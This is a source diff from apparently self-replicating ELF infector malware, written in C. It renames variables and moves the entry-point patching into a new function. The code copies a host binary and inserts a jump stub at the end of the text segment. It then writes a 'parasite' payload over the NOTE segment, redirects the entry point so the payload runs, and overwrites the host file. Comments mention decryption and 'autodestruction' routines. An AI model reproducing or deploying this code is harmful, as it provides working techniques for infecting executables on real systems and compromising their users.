@@ -8,9 +8,8 @@ __attribute__((always_inline)) static inline void write_on_memory(char *dst, cha
 {
 	const size_t beg_stub = (segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - STUB_SIZE;
 	const size_t end_stub = PAGE_SIZE + STUB_SIZE;
-
-	const size_t beg_infection = (segment[DATA]->p_offset + segment[DATA]->p_filesz) - (beg_stub + end_stub);
-	const size_t end_infection = segment[NOTE]->p_filesz + (segment[NOTE]->p_offset - (segment[DATA]->p_offset + segment[DATA]->p_filesz));
+	const size_t beg_parasite = (segment[DATA]->p_offset + segment[DATA]->p_filesz) - (beg_stub + end_stub);
+	const size_t end_parasite = segment[NOTE]->p_filesz + (segment[NOTE]->p_offset - (segment[DATA]->p_offset + segment[DATA]->p_filesz));
 
 	for (register size_t index = 0; index < beg_stub; index++)
 		*dst++ = *src++;
@@ -19,9 +18,9 @@ __attribute__((always_inline)) static inline void write_on_memory(char *dst, cha
 
 	src += STUB_SIZE;
 
-	for (register size_t index = 0; index < beg_infection; index++)
+	for (register size_t index = 0; index < beg_parasite; index++)
 		*dst++ = *src++;
-	for (register size_t index = 0; index < end_infection; index++)
+	for (register size_t index = 0; index < end_parasite; index++)
 		*dst++ = '*';
 }
 
@@ -36,14 +35,19 @@ __attribute__((always_inline)) static inline void insert_stub(char *dst, Elf64_P
 		0xba, 0xba, 0xfe, 0xca
 	};
 
-	const int offset = sizeof(stub) - 4;
-	const int entry_point = 0;
+	const size_t jump_offset = sizeof(stub) - JUMP_SIZE;
+	const size_t entry_point = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - JUMP_OFFSET);
 
-	_memcpy(&stub[offset], &entry_point, sizeof(int));
+	_memcpy(&stub[jump_offset], &entry_point, sizeof(int));
 	_memcpy(dst + ((segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - STUB_SIZE), stub, sizeof(stub));
 }
 
 __attribute__((always_inline)) static inline void insert_parasite(char *dst, Elf64_Phdr **segment)
+{
+	_memcpy(dst + segment[NOTE]->p_offset, __entry, segment[NOTE]->p_filesz);
+}
+
+__attribute__((always_inline)) static inline void patch_entry_point(char *dst, const struct s_host *host)
 {
 	char *tmp = dst + host->segment[NOTE]->p_offset + ((void *)execution - (void *)__entry);
 
@@ -57,13 +61,12 @@ __attribute__((always_inline)) static inline void insert_parasite(char *dst, Elf
 		tmp++;
 	}
 
-	const int offset = (void *)(dst + (host->segment[NOTE]->p_offset + host->segment[NOTE]->p_filesz)) - (void *)tmp;
-	const int entry_point = host->entry[OLD] - host->entry[NEW] - (host->segment[NOTE]->p_filesz - (offset - JUMP_SIZE));
 
-	_memcpy(dst + segment[NOTE]->p_offset, __entry, segment[NOTE]->p_filesz);
-	_memcpy(dst + host->segment[NOTE]->p_offset + (host->segment[NOTE]->p_filesz - offset), &entry_point, sizeof(int));
+	const size_t offset = (void *)(dst + (host->segment[NOTE]->p_vaddr + host->segment[NOTE]->p_memsz)) - (void *)tmp;
+//	const size_t entry_point = host->entry[OLD] - (host->segment[NOTE]->p_vaddr + host->segment[NOTE]->p_memsz);
+
+//	_memcpy(dst + host->segment[NOTE]->p_offset + (host->segment[NOTE]->p_filesz - offset), &entry_point, sizeof(int));
 }
-
 
 ////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
@@ -94,6 +97,7 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 	write_on_memory(ptr, (char *)host->header, host->segment);
 	insert_stub(ptr, host->segment);
 	insert_parasite(ptr, host->segment);
+	patch_entry_point(ptr, host);
 //	decrypt_left(keychain, ptr + host->note->self->p_offset + ((void *)injection - (void *)__entry), (void *)autodestruction - (void *)injection);
 
 	if ((fd = _open(host->filename, O_RDWR | O_TRUNC, 0000)) < 0)
